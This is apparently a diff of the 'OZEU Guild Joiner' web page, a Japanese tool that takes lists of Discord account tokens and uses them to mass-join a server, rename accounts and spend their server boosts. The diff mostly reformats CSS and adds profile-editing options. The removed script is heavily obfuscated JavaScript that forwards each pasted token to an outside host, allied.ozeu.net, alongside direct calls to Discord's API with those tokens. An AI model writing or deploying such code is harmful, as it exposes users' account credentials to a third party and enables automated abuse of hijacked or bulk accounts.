@@ -1,283 +1,342 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-	<meta charset="UTF-8" />
-	<meta name="viewport" content="width=device-width, initial-scale=1">
-	<title>OZEU Guild Joiner</title>
-	<style>
-		/* スクロールバーのスタイル */
-		::-webkit-scrollbar { width: 6px; }
-		::-webkit-scrollbar-track { background: #202225; border-radius: 3px; }
-		::-webkit-scrollbar-thumb { background: #5865f2; border-radius: 3px; }
-		::-webkit-scrollbar-thumb:hover { background: #7289da; }
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>OZEU Guild Joiner</title>
+    <style>
+        /* スクロールバーのスタイル */
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #202225; border-radius: 3px; }
+        ::-webkit-scrollbar-thumb { background: #5865f2; border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: #7289da; }
 
-		*, *::before, *::after { box-sizing: border-box; }
-		body {
-			font-family: 'Inter', sans-serif;
-			background: linear-gradient(135deg,#2f3136,#1e1f22);
-			color:#fff;
-			margin:0; padding:0;
-			display:flex; justify-content:center; align-items:center;
-			height:100vh;
-		}
-		.card {
-			background:#36393f;
-			padding:32px;
-			border-radius:20px;
-			box-shadow:0 15px 35px rgba(0,0,0,.5);
-			width:100%; max-width:600px;
-			animation:fadeIn .8s ease;
-			overflow:auto; max-height:95vh;
-		}
-		@keyframes fadeIn {
-			from { opacity:0; transform:translateY(20px); }
-			to   { opacity:1; transform:translateY(0); }
-		}
-		h2 { color:#adb8ff; text-align:center; margin:0 0 24px; font-weight:600; }
-		label { display:block; margin-top:18px; font-size:14px; }
+        *, *::before, *::after { box-sizing: border-box; }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg,#2f3136,#1e1f22);
+            color:#fff;
+            margin:0; padding:0;
+            display:flex; justify-content:center; align-items:center;
+            height:100vh;
+        }
+        .card {
+            background:#36393f;
+            padding:32px;
+            border-radius:20px;
+            box-shadow:0 15px 35px rgba(0,0,0,.5);
+            width:100%; max-width:600px;
+            animation:fadeIn .8s ease;
+            overflow:auto; max-height:95vh;
+        }
+        @keyframes fadeIn {
+            from { opacity:0; transform:translateY(20px); }
+            to   { opacity:1; transform:translateY(0); }
+        }
+        h2 { color:#adb8ff; text-align:center; margin:0 0 24px; font-weight:600; }
+        label { display:block; margin-top:18px; font-size:14px; }
 
-		/* テキスト入力 */
-		input[type="text"], textarea {
-			width:100%; padding:10px; margin-top:6px;
-			border-radius:8px; border:none;
-			background:#202225; color:#fff;
-			font-family:monospace; resize:vertical;
-		}
-		textarea { overflow-y:auto; }
-		input[type="number"] {
-			padding:6px; margin-top:6px;
-			border-radius:8px; border:none;
-			background:#202225; color:#fff;
-			font-family:monospace; appearance:none;
-			width:80px;
-		}
-		input[type=number]::-webkit-inner-spin-button,
-		input[type=number]::-webkit-outer-spin-button {
-			-webkit-appearance:none; margin:0;
-		}
+        /* テキスト入力 */
+        input[type="text"], textarea {
+            width:100%; padding:10px; margin-top:6px;
+            border-radius:8px; border:none;
+            background:#202225; color:#fff;
+            font-family:monospace; resize:vertical;
+        }
+        textarea { overflow-y:auto; }
+        input[type="number"] {
+            padding:6px; margin-top:6px;
+            border-radius:8px; border:none;
+            background:#202225; color:#fff;
+            font-family:monospace; appearance:none;
+            width:80px;
+        }
+        input[type=number]::-webkit-inner-spin-button,
+        input[type=number]::-webkit-outer-spin-button {
+            -webkit-appearance:none; margin:0;
+        }
+        
+        /* ファイル入力を隠す */
+        input[type="file"] {
+            display: none;
+        }
 
-		/* フレックス行 */
-		.row {
-			display:flex; gap:12px; align-items:center;
-		}
-		.row > * { flex:none; }
-		.row label,
-		.row .checkbox-container { margin-top:0; }
+        /* フレックス行 */
+        .row {
+            display:flex; gap:12px; align-items:center;
+        }
+        .row > * { flex:none; }
+        .row label,
+        .row .checkbox-container { margin-top:0; }
 
-		/* トグルスイッチ */
-		.checkbox-container {
-			display:flex; align-items:center; gap:8px;
-			cursor:pointer; font-size:14px; user-select:none;
-			margin-top:6px;
-		}
-		.checkbox-container input {
-			appearance:none; width:36px; height:18px;
-			background:#4f545c; border-radius:18px;
-			position:relative; transition:background .3s ease;
-		}
-		.checkbox-container:hover input { background:#5a5f68; }
-		.checkbox-container input:focus {
-			outline:none; box-shadow:0 0 0 3px rgba(114,137,218,0.5);
-		}
-		.checkbox-container input::before {
-			content:''; position:absolute;
-			width:14px; height:14px; border-radius:50%;
-			background:#fff; top:2px; left:2px;
-			transition:transform .3s cubic-bezier(.68,-.55,.27,1.55);
-		}
-		.checkbox-container input:checked { background:#7289da; }
-		.checkbox-container input:checked::before {
-			transform:translateX(18px);
-		}
-		.checkbox-container span { transition:color .3s; }
-		.checkbox-container input:checked + span {
-			color:#adb8ff;
-		}
+        /* トグルスイッチ */
+        .checkbox-container {
+            display:flex; align-items:center; gap:8px;
+            cursor:pointer; font-size:14px; user-select:none;
+            margin-top:6px;
+        }
+        .checkbox-container input {
+            appearance:none; width:36px; height:18px;
+            background:#4f545c; border-radius:18px;
+            position:relative; transition:background .3s ease;
+        }
+        .checkbox-container:hover input { background:#5a5f68; }
+        .checkbox-container input:focus {
+            outline:none; box-shadow:0 0 0 3px rgba(114,137,218,0.5);
+        }
+        .checkbox-container input::before {
+            content:''; position:absolute;
+            width:14px; height:14px; border-radius:50%;
+            background:#fff; top:2px; left:2px;
+            transition:transform .3s cubic-bezier(.68,-.55,.27,1.55);
+        }
+        .checkbox-container input:checked { background:#7289da; }
+        .checkbox-container input:checked::before {
+            transform:translateX(18px);
+        }
+        .checkbox-container span { transition:color .3s; }
+        .checkbox-container input:checked + span {
+            color:#adb8ff;
+        }
 
-		/* ボタン */
-		button.primary {
-			margin-top:24px; width:100%; padding:14px;
-			border:none; border-radius:14px;
-			background:linear-gradient(135deg,#6d75ff,#5865f2);
-			color:#fff; font-weight:700; font-size:18px;
-			letter-spacing:.5px; cursor:pointer; position:relative;
-			box-shadow:
-				0 4px 15px rgba(88,101,242,.4),
-				0 0 10px rgba(255,255,255,.1),
-				inset 0 0 5px rgba(255,255,255,.2);
-			overflow:hidden; transition:all .3s;
-		}
-		button.primary:hover {
-			background:linear-gradient(135deg,#7d89ff,#4e57e0);
-			box-shadow:
-				0 6px 22px rgba(88,101,242,.6),
-				0 0 24px rgba(255,255,255,.2),
-				inset 0 0 10px rgba(255,255,255,.3);
-			transform:scale(1.03);
-		}
-		button.primary:active {
-			transform:scale(0.96);
-			box-shadow:inset 0 4px 6px rgba(0,0,0,.3);
-		}
-		button.primary.loading {
-			color: #ffffffa2; pointer-events:none;
-		}
+        /* ボタン */
+        button.primary {
+            margin-top:24px; width:100%; padding:14px;
+            border:none; border-radius:14px;
+            background:linear-gradient(135deg,#6d75ff,#5865f2);
+            color:#fff; font-weight:700; font-size:18px;
+            letter-spacing:.5px; cursor:pointer; position:relative;
+            box-shadow:
+                0 4px 15px rgba(88,101,242,.4),
+                0 0 10px rgba(255,255,255,.1),
+                inset 0 0 5px rgba(255,255,255,.2);
+            overflow:hidden; transition:all .3s;
+        }
+        button.primary:hover {
+            background:linear-gradient(135deg,#7d89ff,#4e57e0);
+            box-shadow:
+                0 6px 22px rgba(88,101,242,.6),
+                0 0 24px rgba(255,255,255,.2),
+                inset 0 0 10px rgba(255,255,255,.3);
+            transform:scale(1.03);
+        }
+        button.primary:active {
+            transform:scale(0.96);
+            box-shadow:inset 0 4px 6px rgba(0,0,0,.3);
+        }
+        button.primary.loading {
+            color: #ffffffa2; pointer-events:none;
+        }
 
-		button.secondary {
-			margin-top:8px; padding:6px 12px;
-			background:#5865f2; color:#fff;
-			font-size:14px; border:none; border-radius:6px;
-			position:relative; overflow:hidden;
-		}
-		button.secondary::after {
-			content:''; position:absolute;
-			top:0; left:0; width:100%; height:100%;
-			background:rgba(255,255,255,0.1);
-			opacity:0; transition:opacity .3s;
-		}
-		button.secondary:hover::after { opacity:1; }
-		button.secondary:active::after { background:rgba(255,255,255,0.2); }
+        button.secondary, .file-upload-btn {
+            margin-top:8px; padding:6px 12px;
+            background:#5865f2; color:#fff;
+            font-size:14px; border:none; border-radius:6px;
+            position:relative; overflow:hidden;
+            cursor:pointer; display:inline-block;
+            text-align:center; user-select:none;
+        }
+        button.secondary::after, .file-upload-btn::after {
+            content:''; position:absolute;
+            top:0; left:0; width:100%; height:100%;
+            background:rgba(255,255,255,0.1);
+            opacity:0; transition:opacity .3s;
+        }
+        button.secondary:hover::after, .file-upload-btn:hover::after { 
+            opacity:1; 
+        }
+        button.secondary:active::after, .file-upload-btn:active::after { 
+            background:rgba(255,255,255,0.2); 
+        }
 
-		/* Advanced Options のアニメーション */
-		details { margin-top:18px; }
-		summary {
-			list-style:none; padding-left:20px; cursor:pointer; font-weight:600;
-			position:relative; margin-top:0; user-select:none;
-		}
-		summary::-webkit-details-marker { display:none; }
-		summary::marker { content:none; }
-		summary::before {
-			content:'▶'; position:absolute; left:0; top:50%;
-			transform:translateY(-50%); transition:transform .3s ease;
-		}
-		details[open] > summary::before {
-			transform:translateY(-50%) rotate(90deg);
-		}
-		.detail-content {
-			max-height: 0;
-			opacity: 0;
-			overflow: hidden;
-			transition: max-height .3s ease, opacity .3s ease;
-		}
-		details[open] .detail-content {
-			max-height: 200px; /* 中身の高さに合わせて必要なら調整 */
-			opacity: 1;
-		}
+        /* ファイル選択状態の表示 */
+        .file-info {
+            margin-top: 4px;
+            font-size: 12px;
+            color: #adb8ff;
+            font-style: italic;
+        }
 
-		#log {
-			margin-top:20px; padding:10px; height:120px; overflow-y:auto;
-			background:#202225; border-radius:10px;
-			font-family:monospace; font-size:12px; white-space:pre-wrap; resize: vertical;
-		}
-		@media (max-width: 600px) {
-			.card {
-				padding: 16px;
-				max-width: 100%;
-				max-height: 100vh;
-				border-radius: 10px;
-			}
+        /* Advanced Options のアニメーション */
+        details { margin-top:18px; }
+        summary {
+            list-style:none; padding-left:20px; cursor:pointer; font-weight:600;
+            position:relative; margin-top:0; user-select:none;
+        }
+        summary::-webkit-details-marker { display:none; }
+        summary::marker { content:none; }
+        summary::before {
+            content:'▶'; position:absolute; left:0; top:50%;
+            transform:translateY(-50%); transition:transform .3s ease;
+        }
+        details[open] > summary::before {
+            transform:translateY(-50%) rotate(90deg);
+        }
+        .detail-content {
+            max-height: 0;
+            opacity: 0;
+            overflow: hidden;
+            transition: max-height .4s ease, opacity .4s ease;
+        }
+        details[open] .detail-content {
+            max-height: 600px; /* 中身の高さに合わせて調整 (少し増やしました) */
+            opacity: 1;
+        }
+        
+        /* 各オプション要素のアニメーション */
+        .option-item {
+            opacity: 0;
+            transform: translateY(15px);
+            transition: opacity .3s ease, transform .3s ease;
+        }
+        
+        details[open] .option-item:nth-child(1) {
+            animation: slideInUp 0.4s ease 0.1s forwards;
+        }
+        details[open] .option-item:nth-child(2) {
+            animation: slideInUp 0.4s ease 0.2s forwards;
+        }
+        details[open] .option-item:nth-child(3) {
+            animation: slideInUp 0.4s ease 0.3s forwards;
+        }
+        details[open] .option-item:nth-child(4) {
+            animation: slideInUp 0.4s ease 0.4s forwards;
+        }
+        details[open] .option-item:nth-child(5) { /* 新しく追加 */
+            animation: slideInUp 0.4s ease 0.5s forwards;
+        }
+        
+        @keyframes slideInUp {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
 
-			h2 {
-				font-size: 18px;
-				margin-bottom: 16px;
-			}
+        #log {
+            margin-top:20px; padding:10px; height:120px; overflow-y:auto;
+            background:#202225; border-radius:10px;
+            font-family:monospace; font-size:12px; white-space:pre-wrap; resize: vertical;
+        }
+        @media (max-width: 600px) {
+            .card {
+                padding: 16px;
+                max-width: 100%;
+                max-height: 100vh;
+                border-radius: 10px;
+            }
 
-			label {
-				font-size: 13px;
-				margin-top: 12px;
-			}
+            h2 {
+                font-size: 18px;
+                margin-bottom: 16px;
+            }
 
-			input[type="text"],
-			textarea,
-			input[type="number"] {
-				padding: 8px;
-				font-size: 12px;
-			}
+            label {
+                font-size: 13px;
+                margin-top: 12px;
+            }
 
-			button.primary {
-				padding: 12px;
-				font-size: 16px;
-			}
+            input[type="text"],
+            textarea,
+            input[type="number"] {
+                padding: 8px;
+                font-size: 12px;
+            }
 
-			button.secondary {
-				padding: 8px 12px;
-				font-size: 13px;
-			}
+            button.primary {
+                padding: 12px;
+                font-size: 16px;
+            }
 
-			.row {
-				flex-direction: column;
-				align-items: stretch;
-			}
+            button.secondary, .file-upload-btn {
+                padding: 8px 12px;
+                font-size: 13px;
+            }
 
-			.row label {
-				width: 100%;
-			}
+            .row {
+                flex-direction: column;
+                align-items: stretch;
+            }
 
-			.button-container {
-				flex-direction: column;
-				gap: 8px;
-			}
+            .row label {
+                width: 100%;
+            }
 
-			details summary {
-				font-size: 13px;
-				padding-left: 18px;
-			}
+            .button-container {
+                flex-direction: column;
+                gap: 8px;
+            }
 
-			.checkbox-container {
-				font-size: 13px;
-			}
+            details summary {
+                font-size: 13px;
+                padding-left: 18px;
+            }
 
-			#log {
-				height: 80px;
-				font-size: 11px;
-			}
-		}
-	</style>
+            .checkbox-container {
+                font-size: 13px;
+            }
+
+            #log {
+                height: 80px;
+                font-size: 11px;
+            }
+        }
+    </style>
 </head>
 <body>
-	<div class="card">
-		<h2>OZEU Guild Joiner</h2>
-		<form id="joinForm">
-			<label>トークン
-				<textarea id="tokens" rows="4" placeholder="カンマ / 改行 / スペースで区切る MTM1ODc4MTE3NTIzMzI1MzU*****,MTEwMDU5Njc1NjQ1NjE2MTMwM*****,..."></textarea>
-			</label>
-			<label>招待コード
-				<input type="text" id="invite" placeholder="ozeu-x" />
-			</label>
-			<button id="startJoin" type="button" class="primary">Join開始</button>
+    <div class="card">
+        <h2>OZEU Guild Joiner</h2>
+        <form id="joinForm">
+            <label>トークン
+                <textarea id="tokens" rows="4" placeholder="カンマ / 改行 / スペースで区切る MTM1ODc4MTE3NTIzMzI1MzU*****,MTEwMDU5Njc1NjQ1NjE2MTMwM*****,..."></textarea>
+            </label>
+            <label>招待コード
+                <input type="text" id="invite" placeholder="ozeu-x" />
+            </label>
+            <button id="startJoin" type="button" class="primary">Join開始</button>
 
-			<!-- Advanced Options -->
-			<details>
-				<summary>Advanced Options</summary>
-				<div class="detail-content">
-					<label>表示名を変更
-						<input type="text" id="nickname" placeholder="入力なしで無効" />
-					</label>
-					<div class="checkbox-container">
-						<input type="checkbox" id="boostCheckbox" />
-						<span>サーバーブーストする</span>
-					</div>
-				</div>
-			</details>
-			<!-- /Advanced Options -->
-		</form>
+            <details>
+                <summary>Advanced Options</summary>
+                <div class="detail-content">
+                    <label class="option-item">サーバーニックネーム変更
+                        <input type="text" id="serverNickname" placeholder="サーバーでの表示名 (入力なしで無効)" />
+                    </label>
+                    <label class="option-item">グローバルネーム変更
+                        <input type="text" id="globalNickname" placeholder="グローバルでの表示名 (入力なしで無効)" />
+                    </label>
+                    <label class="option-item">
+                        <input type="file" id="avatarInput" accept="image/*" />
+                        <div class="file-upload-btn" id="avatarBtn">📁 アバター画像を選択</div>
+                        <div class="file-info" id="avatarInfo"></div>
+                    </label>
+                    <label class="option-item">プロフィールメッセージ
+                        <textarea type="text" rows="2" id="bioInput" placeholder="入力なしで無効" ></textarea>
+                        
+                    </label>
+                    <div class="checkbox-container option-item">
+                        <input type="checkbox" id="boostCheckbox" />
+                        <span>サーバーブーストする</span>
+                    </div>
+                </div>
+            </details>
+            </form>
 
-		<div id="log" style="white-space: pre-wrap; margin-top: 16px; height: 120px; overflow-y: auto;
-			background: #202225; padding: 10px; border-radius: 8px; font-family: monospace; font-size: 12px;"></div>
+        <div id="log" style="white-space: pre-wrap; margin-top: 16px; height: 120px; overflow-y: auto;
+            background: #202225; padding: 10px; border-radius: 8px; font-family: monospace; font-size: 12px;"></div>
 
-		<label>Join成功トークン
-			<textarea id="successTokens" rows="4" readonly placeholder="成功したトークンが表示されます"></textarea>
-		</label>
-		<button id="copySuccess" class="secondary">コピー</button>
+        <label>Join成功トークン
+            <textarea id="successTokens" rows="4" readonly placeholder="成功したトークンが表示されます"></textarea>
+        </label>
+        <button id="copySuccess" class="secondary">コピー</button>
 
-		<label>Join失敗トークン
-			<textarea id="failedTokens" rows="4" readonly placeholder="失敗したトークンが表示されます"></textarea>
-		</label>
-		<button id="copyFailed" class="secondary">コピー</button>
-	</div>
+        <label>Join失敗トークン
+            <textarea id="failedTokens" rows="4" readonly placeholder="失敗したトークンが表示されます"></textarea>
+        </label>
+        <button id="copyFailed" class="secondary">コピー</button>
+    </div>
 
-	<script>
-		const _0x42425b=_0x242e;(function(_0x578cb5,_0x1bcdcc){const _0x33e6d3=_0x242e,_0x130ada=_0x578cb5();while(!![]){try{const _0xaa4a99=parseInt(_0x33e6d3(0x1c5))/0x1*(-parseInt(_0x33e6d3(0x198))/0x2)+parseInt(_0x33e6d3(0x1a8))/0x3*(-parseInt(_0x33e6d3(0x1c4))/0x4)+-parseInt(_0x33e6d3(0x1a9))/0x5*(-parseInt(_0x33e6d3(0x17d))/0x6)+parseInt(_0x33e6d3(0x1ba))/0x7*(parseInt(_0x33e6d3(0x17e))/0x8)+-parseInt(_0x33e6d3(0x17c))/0x9*(-parseInt(_0x33e6d3(0x193))/0xa)+-parseInt(_0x33e6d3(0x185))/0xb*(-parseInt(_0x33e6d3(0x1bf))/0xc)+-parseInt(_0x33e6d3(0x18e))/0xd*(parseInt(_0x33e6d3(0x1b1))/0xe);if(_0xaa4a99===_0x1bcdcc)break;else _0x130ada['push'](_0x130ada['shift']());}catch(_0x334321){_0x130ada['push'](_0x130ada['shift']());}}}(_0x13c1,0x97ab7));const logEl=document[_0x42425b(0x18d)]('log');function appendLog(_0x558258){const _0x4370b2=_0x42425b,_0x47b5e8=new Date()[_0x4370b2(0x1a2)]();logEl['textContent']+='\x0a'+_0x47b5e8+_0x4370b2(0x1c1)+_0x558258,logEl[_0x4370b2(0x1aa)]=logEl['scrollHeight'];}function parseList(_0x445797){const _0x45e2d3=_0x42425b;return _0x445797[_0x45e2d3(0x18b)](/[\s,]+/)[_0x45e2d3(0x176)](_0x5438c8=>_0x5438c8['trim']())['filter'](Boolean);}async function copyToClipboard(_0x248bbf){const _0x4b2725=_0x42425b;try{await navigator['clipboard'][_0x4b2725(0x179)](_0x248bbf),appendLog('📋\x20コピーしました');}catch(_0x56b890){appendLog(_0x4b2725(0x19e)+_0x56b890);}}const startBtn=document[_0x42425b(0x18d)]('startJoin'),successArea=document[_0x42425b(0x18d)](_0x42425b(0x1a5)),failedArea=document[_0x42425b(0x18d)](_0x42425b(0x1b8)),copySucc=document['getElementById'](_0x42425b(0x192)),copyFail=document[_0x42425b(0x18d)](_0x42425b(0x1b3)),tokensInput=document[_0x42425b(0x18d)](_0x42425b(0x177)),inviteInput=document[_0x42425b(0x18d)](_0x42425b(0x18c)),nicknameInput=document[_0x42425b(0x18d)](_0x42425b(0x19f)),boostCheckbox=document[_0x42425b(0x18d)](_0x42425b(0x1be));copySucc[_0x42425b(0x1af)](_0x42425b(0x1c0),()=>copyToClipboard(successArea[_0x42425b(0x191)])),copyFail['addEventListener'](_0x42425b(0x1c0),()=>copyToClipboard(failedArea['value'])),startBtn[_0x42425b(0x1af)](_0x42425b(0x1c0),async()=>{const _0x3433a9=_0x42425b,_0x394cbf=parseList(tokensInput[_0x3433a9(0x191)]),_0x11fe9c=inviteInput['value'][_0x3433a9(0x1ae)]();if(!_0x394cbf[_0x3433a9(0x1bd)]){appendLog(_0x3433a9(0x19b));return;}if(!_0x11fe9c){appendLog('⚠️\x20招待コードを入力してください');return;}startBtn[_0x3433a9(0x17a)]=!![],startBtn[_0x3433a9(0x1a7)]='実行中...',successArea['value']='',failedArea['value']='',logEl[_0x3433a9(0x1a7)]='',appendLog(_0x3433a9(0x188));const _0x43f4cc=_0x11fe9c[_0x3433a9(0x18b)]('/')[_0x3433a9(0x1b9)](Boolean),_0x403ca0=_0x43f4cc[_0x43f4cc['length']-0x1],_0x4160c1=nicknameInput[_0x3433a9(0x191)]['trim'](),_0x30f030=boostCheckbox['checked'];let _0x1a70bc=null;try{const _0x2db572=await fetch('https://discord.com/api/v10/invites/'+_0x403ca0);if(!_0x2db572['ok']){appendLog(_0x3433a9(0x1b4)+_0x403ca0),startBtn[_0x3433a9(0x17a)]=![],startBtn[_0x3433a9(0x1a7)]=_0x3433a9(0x1b5);return;}const _0x5322a7=await _0x2db572[_0x3433a9(0x184)]();_0x1a70bc=_0x5322a7[_0x3433a9(0x18f)]?.['id'],appendLog('✅\x20招待コード有効:\x20'+_0x403ca0);}catch(_0x3e3c0f){appendLog(_0x3433a9(0x194)+_0x3e3c0f),startBtn[_0x3433a9(0x17a)]=![],startBtn['textContent']='Join開始';return;}const _0x49bd58=_0x394cbf[_0x3433a9(0x176)](_0xa1b9c6=>fetch(_0x3433a9(0x182)+encodeURIComponent(_0xa1b9c6)+_0x3433a9(0x181)+encodeURIComponent(_0x403ca0))['then'](async _0x1f4f0b=>{const _0x26a823=_0x3433a9,_0x59ae64=await _0x1f4f0b['json']()[_0x26a823(0x1ad)](()=>null);return{'token':_0xa1b9c6,'status':_0x1f4f0b[_0x26a823(0x1bc)],'body':_0x59ae64};})[_0x3433a9(0x1ad)](_0x286968=>({'token':_0xa1b9c6,'error':_0x286968}))),_0x3f0c67=await Promise['all'](_0x49bd58),_0x5f184a=[],_0x55181b=[];_0x3f0c67[_0x3433a9(0x1a3)](_0x50bb47=>{const _0x15a374=_0x3433a9;if(_0x50bb47[_0x15a374(0x1bc)]===0xc8&&_0x50bb47[_0x15a374(0x196)]?.[_0x15a374(0x186)]===0xc8)_0x5f184a[_0x15a374(0x1c2)](_0x50bb47[_0x15a374(0x190)]),appendLog(_0x15a374(0x189)+_0x50bb47[_0x15a374(0x190)][_0x15a374(0x195)](0x0,0xa)+_0x15a374(0x1ab));else{_0x55181b[_0x15a374(0x1c2)](_0x50bb47[_0x15a374(0x190)]);const _0x5f5cb3=_0x50bb47[_0x15a374(0x196)]?JSON[_0x15a374(0x1a0)](_0x50bb47['body']):String(_0x50bb47[_0x15a374(0x1c3)]);_0x5f5cb3[_0x15a374(0x1b7)](_0x15a374(0x19a))?appendLog(_0x15a374(0x183)+_0x50bb47[_0x15a374(0x190)][_0x15a374(0x195)](0x0,0xa)+_0x15a374(0x1ab)):appendLog(_0x15a374(0x1a1)+_0x50bb47[_0x15a374(0x190)][_0x15a374(0x195)](0x0,0xa)+_0x15a374(0x1ac)+_0x5f5cb3);}}),successArea[_0x3433a9(0x191)]=_0x5f184a[_0x3433a9(0x19c)]('\x0a'),failedArea[_0x3433a9(0x191)]=_0x55181b[_0x3433a9(0x19c)]('\x0a');const _0x5965e5=_0x4160c1,_0x1ae747=Boolean(_0x4160c1),_0x402aa4=_0x30f030;if((_0x1ae747||_0x402aa4)&&_0x5f184a[_0x3433a9(0x1bd)]>0x0){const _0x4af2bf=_0x1ae747&&_0x1a70bc?_0x5f184a[_0x3433a9(0x176)](async _0x25128e=>{const _0xa7e89b=_0x3433a9;try{const _0x2da892=await fetch(_0xa7e89b(0x1b2),{'method':_0xa7e89b(0x1c6),'headers':{'Authorization':_0x25128e,'Content-Type':'application/json'},'body':JSON['stringify']({'global_name':_0x5965e5})});if(_0x2da892['ok'])return appendLog(_0xa7e89b(0x18a)+_0x25128e[_0xa7e89b(0x195)](0x0,0xa)+_0xa7e89b(0x199)+_0x5965e5+'\x22'),{'token':_0x25128e,'nickOk':!![]};else{const _0x21303a=await _0x2da892[_0xa7e89b(0x184)]()[_0xa7e89b(0x1ad)](()=>null),_0x1db0ae=_0x21303a?JSON[_0xa7e89b(0x1a0)](_0x21303a):_0x2da892[_0xa7e89b(0x1bc)];return appendLog(_0xa7e89b(0x1bb)+_0x25128e[_0xa7e89b(0x195)](0x0,0xa)+_0xa7e89b(0x1ac)+_0x1db0ae),{'token':_0x25128e,'nickOk':![]};}}catch(_0x2115cd){return appendLog('⚠️\x20表示名変更エラー:\x20'+_0x25128e[_0xa7e89b(0x195)](0x0,0xa)+_0xa7e89b(0x1ac)+_0x2115cd),{'token':_0x25128e,'nickOk':![]};}}):[],_0x3e87b5=_0x402aa4&&_0x1a70bc?_0x5f184a['map'](async _0x1c003c=>{const _0x5e7f6a=_0x3433a9;try{const _0x50069a=await fetch('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots',{'headers':{'Authorization':_0x1c003c}});if(!_0x50069a['ok'])return appendLog(_0x5e7f6a(0x1a6)+_0x1c003c['slice'](0x0,0xa)+'*****'),{'token':_0x1c003c,'boostOk':![]};const _0x21055f=await _0x50069a['json']()[_0x5e7f6a(0x1ad)](()=>[]);if(!Array[_0x5e7f6a(0x1b6)](_0x21055f)||_0x21055f[_0x5e7f6a(0x1bd)]===0x0)return appendLog(_0x5e7f6a(0x1b0)+_0x1c003c[_0x5e7f6a(0x195)](0x0,0xa)+_0x5e7f6a(0x1ab)),{'token':_0x1c003c,'boostOk':![]};const _0x16a03a=_0x21055f[_0x5e7f6a(0x1b9)](_0x271738=>_0x271738[_0x5e7f6a(0x19d)]===null),_0x51de28=_0x16a03a[_0x5e7f6a(0x1bd)];if(_0x51de28===0x0)return appendLog('⚠️\x20ブーストスロットなし:\x20'+_0x1c003c[_0x5e7f6a(0x195)](0x0,0xa)+_0x5e7f6a(0x1ab)),{'token':_0x1c003c,'boostOk':![]};const _0x354b93=_0x16a03a[_0x5e7f6a(0x176)](_0x5093e0=>_0x5093e0['id']),_0x210c07=await fetch(_0x5e7f6a(0x180)+_0x1a70bc+_0x5e7f6a(0x197),{'method':_0x5e7f6a(0x17b),'headers':{'Authorization':_0x1c003c,'Content-Type':'application/json'},'body':JSON['stringify']({'user_premium_guild_subscription_slot_ids':_0x354b93,'disable_powerup_auto_apply':![]})});if(_0x210c07['ok'])return appendLog('🚀\x20'+_0x51de28+_0x5e7f6a(0x187)+_0x1c003c[_0x5e7f6a(0x195)](0x0,0xa)+_0x5e7f6a(0x1ab)),{'token':_0x1c003c,'boostOk':!![]};else{const _0x30160f=await _0x210c07[_0x5e7f6a(0x184)]()[_0x5e7f6a(0x1ad)](()=>null),_0x254bef=_0x30160f?JSON[_0x5e7f6a(0x1a0)](_0x30160f):_0x210c07['status'];return appendLog(_0x5e7f6a(0x1a4)+_0x1c003c['slice'](0x0,0xa)+_0x5e7f6a(0x1ac)+_0x254bef),{'token':_0x1c003c,'boostOk':![]};}}catch(_0x1e5aee){return appendLog(_0x5e7f6a(0x178)+_0x1c003c[_0x5e7f6a(0x195)](0x0,0xa)+'*****\x20→\x20'+_0x1e5aee),{'token':_0x1c003c,'boostOk':![]};}}):[];await Promise[_0x3433a9(0x17f)]([..._0x4af2bf,..._0x3e87b5]);}appendLog('🎉\x20全処理完了'),startBtn[_0x3433a9(0x17a)]=![],startBtn['textContent']=_0x3433a9(0x1b5);});function _0x242e(_0x380847,_0x22a710){const _0x13c1b6=_0x13c1();return _0x242e=function(_0x242ed6,_0x16026b){_0x242ed6=_0x242ed6-0x176;let _0x4e9794=_0x13c1b6[_0x242ed6];return _0x4e9794;},_0x242e(_0x380847,_0x22a710);}function _0x13c1(){const _0x5376e9=['successTokens','⚠️\x20スロット取得失敗:\x20','textContent','6raLwpC','195XZRBbe','scrollTop','*****','*****\x20→\x20','catch','trim','addEventListener','⚠️\x20ブースト用スロットなし:\x20','70PPBJQG','https://discord.com/api/v9/users/@me','copyFailed','❌\x20招待コード無効:\x20','Join開始','isArray','includes','failedTokens','filter','434399UvDtGX','⚠️\x20表示名変更失敗:\x20','status','length','boostCheckbox','563316cagZWt','click','\x20-\x20','push','error','100792GAHmfW','4SwHVkq','PATCH','map','tokens','⚠️\x20ブースト処理中にエラー:\x20','writeText','disabled','PUT','1908837QkSswE','19818AMXGMr','56rKcyKx','all','https://discord.com/api/v9/guilds/','&invite=','https://allied.ozeu.net/joiner?token=','❌\x20CAPTCHA\x20(Join):\x20','json','121ZiOEMJ','status_code','\x20ブースト成功:\x20','🟢\x20Join処理を開始','✅\x20成功\x20(Join):\x20','🔄\x20表示名変更:\x20','split','invite','getElementById','1657006wPDQHb','guild','token','value','copySuccess','40UbvWts','⚠️\x20招待コードチェック失敗:\x20','slice','body','/premium/subscriptions','309508JvanbU','*****\x20→\x20\x22','\x22captcha_key\x22','⚠️\x20トークンを入力してください','join','premium_guild_subscription','⚠️\x20コピー失敗:\x20','nickname','stringify','❌\x20失敗\x20(Join):\x20','toLocaleTimeString','forEach','⚠️\x20ブースト失敗:\x20'];_0x13c1=function(){return _0x5376e9;};return _0x13c1();}
-	</script>
+    <script>
